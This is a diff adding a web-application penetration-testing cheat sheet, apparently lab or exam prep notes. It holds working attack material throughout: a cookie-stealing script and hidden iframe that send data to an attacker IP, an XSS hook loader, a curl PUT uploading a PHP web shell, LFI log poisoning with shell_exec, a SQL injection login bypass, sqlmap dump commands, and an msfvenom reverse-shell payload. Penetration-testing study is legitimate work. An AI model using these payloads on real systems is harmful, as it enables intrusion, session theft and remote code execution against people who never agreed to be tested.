@@ -1,0 +1,143 @@
+curl -X TRACE 10.11.1.
+
+# Heartbleed
+sslscan INSERTIPADDRESS:443
+nmap -sV --script=ssl-heartbleed 192.168.101.8
+
+ls -l /usr/share/nmap/scripts/http*
+
+Hydra enum host and create list with crunch and cewl
+
+nikto -host
+dirbuster
+burpsuite
+
+LFI/RFI
+
+SQL injection
+
+ Affected Software: Internet Explorer 8
+** Vulnerability: Fixed Col Span ID
+** CVE: CVE-2012-1876
+
+XSS= <script src="http://172.17.15.118:3000/hook.js"></script>
+
+Coldfusion = autopwn
+
+searchsploit Apache 2.4.7 | grep -v '/dos/'
+searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"
+
+# Only search the title (exclude the path), add the -t
+searchsploit -t Apache | grep -v '/dos/'
+
+https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+
+is it running php before 5.3? 
+
+Can you NC into 80 and add script? 
+
+Can you traverse directories? Did you fuzz them?
+
+Have you tried logins from other other boxes you cracked? 
+
+sqlmap -u "http://meh.com/meh.php?id=1" 
+--dbms=mysql --tech=U --random-agent --dump 
+
+check http://www.0daysecurity.com/penetration-testing/enumeration.html for walkthroughs on different languages used for the web. 
+
+Is WEBDAV up and active?
+
+<iframe SRC="http://10.11.0.73:81/report" height = "0" width = "0"></iframe>
+
+Makes them report back to your machine
+
+Port 80 - Web server
+
+Server:
+Scripting language:
+Apache Modules:
+IP-address:
+Domain-name address:
+INSERTCURLHEADER
+
+Web application (ex, wordpress, joomla, phpmyadmin)
+Name:
+Version:
+Admin-login:
+
+# Nikto
+nikto -h http://INSERTIPADDRESS
+
+# Nikto with squid proxy
+nikto -h INSERTIPADDRESS -useproxy http://INSERTIPADDRESS:4444
+
+# Get header
+curl -i INSERTIPADDRESS
+
+# Get everything
+curl -i -L INSERTIPADDRESS
+
+# Check for title and all links
+curl INSERTIPADDRESS -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
+
+# Look at page with just text
+curl INSERTIPADDRESS -s -L | html2text -width '99' | uniq
+
+# Check if it is possible to upload
+curl -v -X OPTIONS http://INSERTIPADDRESS/
+curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/shell.php
+
+dotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o unix
+
+<script> new Image().src="http://10.11.0.73:81/bogus.php?output="+document.cookie;</script>
+
+steals their session cookie
+
+both times, remember to set up a nc listening on port 81 to catch the incoming responses.
+
+Then take the cookies to cookies manager and use them to log in.
+
+LFI:
+nc into the victim and drop 
+
+<?php echo shell_exec($_GET['cmd']);?>
+
+it will relocate to: 
+
+../../../../../../../windows/system32/drivers/etc/hosts%00
+
+(before php 5.3, all requests end with a %00 byte to ignore everything after the request)
+
+Now, append a cmd variable to the url and pass the command
+
+cmd=ipconfig&LANG=../../../../../../../xampp/apache/logs/accesslog%00
+
+Classic authentication bypass for SQL:
+
+any' or 1=1 limit 1;#
+
+go to /var/www/ see what you already have such as: html_shell.html
+
+start-tftp-server #on attacker machine using
+tftp -i 192.168.14.220 GET nc.exe # to copy files to target machines OR PUSH to send files
+
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.14.220 LPORT=443 -f js_le --platform windows -a x86 -e generic/none
+
+ms12-037
+internet explorer vulnerabilities
+check it out at 
+technet.microsoft.com/en-us/security/bulletin/ms12-037
+online labs suggest
+exploit-db.com/exploits/24017/
+
+LFI/RFI
+
+fimap -u "http://INSERTIPADDRESS/example.php?test="
+
+# Ordered output
+curl -s http://INSERTIPADDRESS/gallery.php?page=/etc/passwd
+/root/Tools/Kadimus/kadimus -u http://INSERTIPADDRESS/example.php?page=
+
+
+Password brute force - last resort
+cewl
